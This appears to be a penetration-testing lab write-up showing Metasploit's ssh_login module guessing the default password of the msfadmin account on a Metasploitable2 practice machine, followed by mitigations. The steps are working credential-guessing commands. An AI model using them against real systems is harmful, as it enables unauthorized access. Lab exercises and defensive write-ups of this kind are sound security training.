# Exploit 2: Default SSH Credentials

**Target:** Metasploitable2, 192.168.56.101, SSH port 22
**Severity:** High

## Steps
1. Load the SSH login tester: `use auxiliary/scanner/ssh/ssh_login`
2. Set the target: `set RHOSTS 192.168.56.101`
3. Set the username: `set USERNAME msfadmin`
4. Set the password list: `set PASS_FILE passwords.txt`
5. Stop on the first match: `set STOP_ON_SUCCESS true`
6. Run it: `run`

Result: `Success: 'msfadmin:msfadmin'`

## Why It Works
The account uses a default password that is widely known and easy to guess. Anyone who tries common passwords can log in.

## Mitigation
- Change every default password to a strong, unique one.
- Turn off password login for SSH and use key-based login.
- Limit SSH access to trusted IP addresses with a firewall rule.
